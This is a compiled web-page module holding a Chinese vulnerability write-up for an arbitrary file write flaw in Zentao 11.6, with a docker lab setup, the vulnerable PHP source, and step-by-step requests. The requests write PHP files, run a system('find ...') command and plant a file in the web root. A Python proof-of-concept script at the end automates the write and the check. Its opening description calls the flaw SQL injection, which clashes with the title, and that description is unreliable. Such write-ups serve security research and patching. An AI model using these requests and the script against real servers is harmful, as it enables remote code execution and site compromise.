import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as n,b as s,d as p,e as a}from"./app-58e4a7d6.js";const c={},u=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>禅道 11.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>这里使用docker环境搭建</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,7),r={href:"http://xxx.xxx.xxx.xxx:8084",target:"_blank",rel:"noopener noreferrer"},d=n("strong",null,"http://xxx.xxx.xxx.xxx:8084",-1),k=a(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162304907.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>这里造成漏洞的原因同样是调用接口权限无限制的原因</p><p>接口出现漏洞的原因具体参考可以查看上一篇 <strong>禅道 11.6版本 SQL注入漏洞</strong> 关于此漏洞的完整分析</p><p>查看<strong>module/api/ediyor/moudel.php</strong>下的<strong>save方法</strong></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$fileContent</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">post</span><span class="token operator">-&gt;</span><span class="token property">fileContent</span><span class="token punctuation">;</span>
        <span class="token variable">$evils</span>       <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;eval&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;exec&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;passthru&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;proc_open&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;shell_exec&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;system&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;$$&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;include&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;require&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;assert&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$gibbedEvils</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;e v a l&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;e x e c&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39; p a s s t h r u&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39; p r o c _ o p e n&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;s h e l l _ e x e c&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;s y s t e m&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;$ $&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;i n c l u d e&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;r e q u i r e&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;a s s e r t&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$fileContent</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$gibbedEvils</span><span class="token punctuation">,</span> <span class="token variable">$evils</span><span class="token punctuation">,</span> <span class="token variable">$fileContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$fileContent</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$fileContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$dirPath</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$extFilePath</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">,</span> <span class="token constant">DS</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;ext&#39;</span> <span class="token operator">.</span> <span class="token constant">DS</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dirPath</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$extFilePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dirPath</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$dirPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">,</span> <span class="token variable">$fileContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token class-name static-context">js</span><span class="token operator">::</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lang</span><span class="token operator">-&gt;</span><span class="token property">editor</span><span class="token operator">-&gt;</span><span class="token property">notWritable</span> <span class="token operator">.</span> <span class="token variable">$extFilePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6),m=n("p",null,[n("strong",null,[n("span",{class:"katex"},[n("span",{class:"katex-mathml"},[n("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[n("semantics",null,[n("mrow",null,[n("mi",null,"f"),n("mi",null,"i"),n("mi",null,"l"),n("mi",null,"e"),n("mi",null,"P"),n("mi",null,"a"),n("mi",null,"t"),n("mi",null,"h"),n("mtext",null,"参数和")]),n("annotation",{encoding:"application/x-tex"},"filePath参数和")])])]),n("span",{class:"katex-html","aria-hidden":"true"},[n("span",{class:"base"},[n("span",{class:"strut",style:{height:"0.8889em","vertical-align":"-0.1944em"}}),n("span",{class:"mord mathnormal",style:{"margin-right":"0.10764em"}},"f"),n("span",{class:"mord mathnormal"},"i"),n("span",{class:"mord mathnormal",style:{"margin-right":"0.01968em"}},"l"),n("span",{class:"mord mathnormal"},"e"),n("span",{class:"mord mathnormal",style:{"margin-right":"0.13889em"}},"P"),n("span",{class:"mord mathnormal"},"a"),n("span",{class:"mord mathnormal"},"t"),n("span",{class:"mord mathnormal"},"h"),n("span",{class:"mord cjk_fallback"},"参数和")])])]),s("fileContent参数")]),s(" 我们是可控的")],-1),v=a(`<p>调用方法往 <strong>/tmp</strong>写入一个<strong>phpinfo()</strong></p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php

POST:fileContent=&lt;?php phpinfo();?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162305743.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162305838.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在利用 禅道 11.6版本 任意文件读取漏洞 第二种方法来文件包含</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162305119.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>也可以写入网站目录中</p><p>先获取地址</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell

POST：fileContent=&lt;?php system(&#39;find / -name ioncube.php&#39;)?&gt;&#39;);?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,10),g={href:"http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1",target:"_blank",rel:"noopener noreferrer"},b=n("strong",null,"http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1",-1),x=a(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162305332.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>得到目录为 <strong>/app/zentaopma/www</strong></p><p>请求改为</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell

fileContent=&lt;?php file_put_contents(&#39;/app/zentaopms/www/xxx.php&#39;, &#39;&lt;?php phpinfo();?&gt;&#39;);?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,4),h={href:"http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1",target:"_blank",rel:"noopener noreferrer"},f=n("strong",null,"http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1",-1),_=a(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162305334.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162305426.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python3</span>
<span class="token comment">#-*- coding:utf-8 -*-</span>
<span class="token comment"># author : PeiQi</span>
<span class="token comment"># from   : http://wiki.peiqi.tech</span>

<span class="token keyword">import</span> base64
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> re
<span class="token keyword">import</span> json
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号 : PeiQi文库                                                        \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: zentao version = 11.6                                    \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式: python3 poc.py                                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mZentaosid   &gt;&gt;&gt; xxxxxxxxxxxxxx(cookie字段)                          \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    version_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/www/index.php?mode=getconfig&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>version_url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        version <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;version&#39;</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 禅道版本为:{}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>version<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 获取版本失败 \\033[0m&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_2</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> zentaosid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Cookie&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;zentaosid={}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>zentaosid<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;fileContent&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><span class="token punctuation">}</span>
    write_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/api-getModel-editor-save-filePath=/tmp/test&quot;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>write_url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 尝试写入php文件... \\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 写入php文件失败 \\033[0m&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_3</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> zentaosid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Cookie&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;zentaosid={}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>zentaosid<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/api-getModel-api-getMethod-filePath=/tmp/test/1&quot;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;System&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 成功写入文件，存在漏洞, 访问 {}/api-getModel-api-getMethod-filePath=/tmp/test/1/ 查看 \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 读取php文件失败 \\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 读取php文件失败 \\033[0m&quot;</span><span class="token punctuation">)</span>



<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl   &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    zentaosid  <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mZentaosid &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    POC_2<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> zentaosid<span class="token punctuation">)</span>
    POC_3<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> zentaosid<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162305586.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,5);function y(w,q){const t=o("ExternalLinkIcon");return i(),l("div",null,[u,n("p",null,[s("访问 "),n("a",r,[d,p(t)]),s(" 按步骤安装即可")]),k,m,v,n("p",null,[s("访问"),n("a",g,[b,p(t)])]),x,n("p",null,[s("再去访问"),n("a",h,[f,p(t)]),s("则会再网站目录下生成 xxx.php 文件")]),_])}const z=e(c,[["render",y],["__file","禅道 11.6 api-getModel-editor-save-filePath 任意文件写入漏洞.html.vue"]]);export{z as default};
